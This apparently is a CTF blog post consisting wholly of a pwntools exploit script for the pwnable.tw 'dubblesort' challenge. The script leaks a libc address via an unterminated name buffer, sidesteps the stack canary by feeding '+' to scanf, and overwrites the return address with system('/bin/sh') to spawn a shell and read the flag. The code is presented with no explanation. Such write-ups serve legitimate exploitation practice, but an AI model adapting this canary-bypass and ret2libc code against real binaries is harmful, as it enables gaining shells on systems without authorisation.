+++
title = 'Pwnable.tw'
date = 2026-02-16T10:53:32+07:00
draft = false
categories = ["pwn"]
+++

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('dubblesort_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)
ra     = lambda proc=None: proc.recvall() if proc else p.recvall()

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+85 
        b*main+237
        b*main+310
    """)

if args.REMOTE:
    p = remote("chall.pwnable.tw", int("10101"))
else:
    qemu_bin = None
    if qemu_bin:
        p = process([qemu_bin] + qemu_args + [exe.path]) # type: ignore
    else:
        p = process([exe.path])
    if args.GDB:
        GDB()

# Gud luk pwner !

# LEAK LIBC ADDRESS
# name = b'A' * 24   --> Local offset
name = b'A' * 28
sla(b'name :', name)
rl()
raw = r(3)
leak = u32(raw + b'\x00') << 8
info(f"Leaked libc address: {hex(leak)}")
libc.address = leak - 0x1b0000
info(f"Libc base: {hex(libc.address)}")
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
info(f"system: {hex(system)}")
info(f"/bin/sh: {hex(binsh)}")

# EXPLOIT
slna('sort :', 35)
for i in range(24):
    slna('number :', i)
sla('number :', '+')
for i in range(24, 33):
    slna('number :', system)
slna('number :', binsh)

sl('cat /home/dubblesort/flag')


p.interactive()
```